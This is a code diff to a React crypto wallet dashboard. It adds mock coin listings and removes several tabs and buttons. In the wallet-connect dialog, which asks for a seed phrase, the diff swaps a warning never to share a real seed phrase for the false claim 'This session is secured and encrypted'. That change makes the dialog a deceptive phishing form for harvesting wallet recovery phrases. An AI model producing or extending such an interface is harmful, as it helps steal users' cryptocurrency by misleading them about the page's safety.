@@ -48,6 +48,15 @@ const Dashboard = () => {
   const walletId = "3535688863";
   const mockCryptos = [
     { 
+      id: "usdt", 
+      name: "usdt", 
+      symbol: "eth", 
+      price: 0.99, 
+      change: +0.05, 
+      amount: 0.000,
+      image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+    },
+    { 
       id: "bitcoin", 
       name: "bitcoin", 
       symbol: "btc", 
@@ -60,10 +69,28 @@ const Dashboard = () => {
       id: "ethereum", 
       name: "ethereum", 
       symbol: "eth", 
-      price: 2046.17, 
-      change: -7.72, 
+      price: 1943, 
+      change: -3.2, 
       amount: 0.000,
       image: "https://cryptologos.cc/logos/ethereum-eth-logo.png"
+    },
+    { 
+      id: "solana", 
+      name: "Solana", 
+      symbol: "sol", 
+      price: 126.20, 
+      change: +6.24, 
+      amount: 0.000,
+      image: "https://cryptologos.cc/logos/solana-sol-logo.png"
+    },
+    { 
+      id: "litecoin", 
+      name: "Litecoin", 
+      symbol: "ltc", 
+      price: 91.75, 
+      change: +3.72, 
+      amount: 0.000,
+      image: "https://cryptologos.cc/logos/litecoin-ltc-logo.png"
     }
   ];
 
@@ -262,81 +289,6 @@ const Dashboard = () => {
           ))}
         </div>
 
-        <Tabs defaultValue="portfolio" className="w-full mt-8">
-          <TabsList className="mb-6">
-            <TabsTrigger value="portfolio">portfolio</TabsTrigger>
-            <TabsTrigger value="transactions">transactions</TabsTrigger>
-            <TabsTrigger value="wallets">wallets</TabsTrigger>
-          </TabsList>
-
-          <TabsContent value="portfolio">
-            <Card>
-              <CardHeader>
-                <CardTitle>your portfolio</CardTitle>
-                <CardDescription>view all your crypto assets in one place</CardDescription>
-              </CardHeader>
-              <CardContent>
-                <div className="text-center py-10">
-                  <p className="text-gray-500">no assets found</p>
-                  <Button variant="outline" className="mt-4" onClick={() => window.location.href = '/transaction'}>
-                    add assets
-                  </Button>
-                </div>
-              </CardContent>
-            </Card>
-          </TabsContent>
-
-          <TabsContent value="transactions">
-            <Card>
-              <CardHeader>
-                <CardTitle>transaction history</CardTitle>
-                <CardDescription>view your recent transactions</CardDescription>
-              </CardHeader>
-              <CardContent>
-                <div className="bg-gray-100 dark:bg-gray-800 rounded-md p-4">
-                  <div className="flex justify-between font-medium mb-4">
-                    <span>transactions</span>
-                    <span>amount</span>
-                  </div>
-                  <div className="text-center py-6">
-                    <p className="text-gray-500">no record found!</p>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-          </TabsContent>
-
-          <TabsContent value="wallets">
-            <Card>
-              <CardHeader>
-                <CardTitle>connect wallet</CardTitle>
-                <CardDescription>connect your external wallet</CardDescription>
-              </CardHeader>
-              <CardContent>
-                <div className="flex flex-col gap-4">
-                  <Button 
-                    variant="outline" 
-                    onClick={handleConnectWallet}
-                    disabled={isConnecting}
-                  >
-                    {isConnecting ? (
-                      <>
-                        <Loader className="mr-2 h-4 w-4 animate-spin" />
-                        connecting...
-                      </>
-                    ) : (
-                      "connect external wallet"
-                    )}
-                  </Button>
-                  <p className="text-xs text-gray-500">
-                    connect your external wallet to manage your assets across different platforms.
-                  </p>
-                </div>
-              </CardContent>
-            </Card>
-          </TabsContent>
-        </Tabs>
-
         {/* Connect Wallet Dialog */}
         <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
           <DialogContent className="sm:max-w-md">
@@ -355,7 +307,7 @@ const Dashboard = () => {
                   onChange={(e) => setSeedPhrase(e.target.value)}
                 />
                 <p className="text-xs text-amber-500">
-                  warning: this is a demo app. never share your real seed phrase with any website.
+                  This session is secured and encrypted
                 </p>
               </div>
             </div>
@@ -403,12 +355,6 @@ const Dashboard = () => {
             </Button>
             <Button size="icon" className="rounded-full bg-green-500 hover:bg-green-600" onClick={() => handleReceiveCrypto(crypto)}>
               <Download className="h-5 w-5" />
-            </Button>
-            <Button size="icon" className="rounded-full bg-blue-400 hover:bg-blue-500">
-              <ShoppingCart className="h-5 w-5" />
-            </Button>
-            <Button size="icon" className="rounded-full bg-blue-600 hover:bg-blue-700">
-              <Wallet className="h-5 w-5" />
             </Button>
           </div>
         </div>
